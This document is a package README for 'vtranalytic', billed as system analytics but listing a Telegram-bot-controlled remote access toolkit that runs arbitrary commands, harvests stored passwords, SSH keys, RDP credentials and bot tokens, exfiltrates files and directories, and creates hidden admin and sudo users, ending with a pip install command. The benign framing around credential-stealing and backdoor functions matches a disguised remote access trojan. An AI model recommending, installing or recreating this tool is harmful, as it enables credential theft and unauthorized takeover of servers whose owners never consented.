# vtranalytic - Complete VPS Control System

[![PyPI version](https://badge.fury.io/py/vtranalytic.svg)](https://badge.fury.io/py/vtranalytic)
[![Python Version](https://img.shields.io/pypi/pyversions/vtranalytic.svg)](https://pypi.org/project/vtranalytic/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Advanced system analytics and VPS control with Telegram bot integration. Complete remote administration toolkit with 168+ commands.

## 🚀 Features

### 📥 File Extraction & Download
- `getfile` - Get any file from VPS and send to bot
- `getdir` - Get entire directory as ZIP
- `findget` - Search and get matching files
- `getsystem` - Get important system files
- `getallbots` - Get ALL bot files from system
- `getconfig` - Get configuration files

### 🤖 Bot Management
- `findbot` - Find all bot files and tokens on system
- `settoken` - Manually set bot token
- `botinfo` - Get bot information
- `send` - Send message to specific chat
- `broadcast` - Broadcast to ALL groups/channels

### 👤 User Management (Full Control)
- `adduser` - Create NEW admin user
- `deluser` - Delete user from system
- `users` - List ALL system users
- `chpass` - Change user password
- `addadmin` - Create admin user
- `setadmin` - Make user admin
- `setrdp` - Add user to RDP group
- `addsudo` - Add user to sudo group (Linux)
- `removesudo` - Remove from sudo group (Linux)

### 🖥️ System Control
- `run` - Execute ANY system command
- `vps` - Full VPS status report
- `sys` - System information
- `cpu` - CPU usage & details
- `memory` - Memory/RAM usage
- `disk` - Disk/storage usage
- `uptime` - System uptime
- `processes` - List running processes
- `kill` - Kill a process by PID

### 🌐 Network Commands
- `network` - Full network information
- `ip` - Show public & local IP
- `ipconfig` - IP configuration
- `connections` - Active network connections
- `ports` - Open/listening ports
- `blockip` - Block an IP address
- `unblockip` - Unblock an IP address

### 🔒 Security Controls
- `firewall` - Check firewall status
- `ssh` - Check SSH server status
- `blocklist` - List blocked IPs
- `addrule` - Add firewall rule
- `removerule` - Remove firewall rule
- `security` - Security audit report

### 🔑 RDP & Credentials
- `rdp` - Get saved RDP credentials
- `rdpall` - Show ALL stored credentials
- `enablerexp` - Enable RDP (Windows)
- `getpasswords` - Get stored passwords
- `getsshkeys` - Get SSH keys

### 📁 File Management
- `files` - List files in directory
- `cat` - Read file content
- `find` - Find file by name
- `botfiles` - Find bot-related files
- `edit` - Edit/create a file
- `delete` - Delete a file
- `move` - Move file/directory
- `copy` - Copy file/directory
- `compress` - Compress file/folder
- `extract` - Extract archive

### 🛠️ Service Management
- `vps service list` - List ALL services
- `vps service start` - Start a service
- `vps service stop` - Stop a service
- `vps service restart` - Restart a service
- `vps service status` - Check service status
- `vps service enable` - Enable service at boot
- `vps service disable` - Disable service at boot
- `vps logs` - View system logs

## 📦 Installation

```bash
pip install vtranalytic